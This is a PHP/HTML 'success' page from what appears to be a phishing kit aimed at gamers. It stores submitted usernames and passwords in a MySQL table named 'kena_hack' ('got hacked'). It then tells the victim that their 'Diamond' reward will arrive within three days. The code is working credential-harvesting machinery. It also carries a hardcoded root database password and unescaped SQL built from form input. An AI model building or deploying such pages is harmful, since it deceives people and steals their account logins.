<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success Message</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image:url(gambar/emel.jpg);

        }

        .card {
            background-color: #007BFF; /* Warna latar belakang kartu */
            color: #fff; /* Warna teks pada kartu */
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); /* Bayangan kartu */
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .message {
            font-size: 18px;
            margin-bottom: 10px;
        }

        .wish {
            font-size: 24px; /* Ukuran font yang lebih besar untuk pesan semoga beruntung */
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <?php
        $hostname = "localhost"; 
        $username = "root"; 
        $password = "albargustiar"; 
        $database = "phising"; 

        $koneksi = mysqli_connect($hostname, $username, $password, $database);

        if (!$koneksi) {
            die("Koneksi gagal: " . mysqli_connect_error());
        } else {
            echo "Data berhasil";
        }

        if(isset($_POST['username']) && isset($_POST['password'])) {
            $username = $_POST['username'];
            $password = $_POST['password'];
            $sql = "INSERT INTO kena_hack VALUES ('$username', '$password')";

            if(mysqli_query($koneksi, $sql)) {
                echo "<p class='message'>Data berhasil dimasukkan, Diamond mu akan dapat secara otomatis, dalam waktu 3 hari,</p>";
                echo "<p class='wish'>semoga beruntung!</p>";
            } else {
                echo "Error: " . $sql . "<br>" . mysqli_error($koneksi);
            }
        }

        mysqli_close($koneksi);
        ?>
    </div>
</body>
</html>
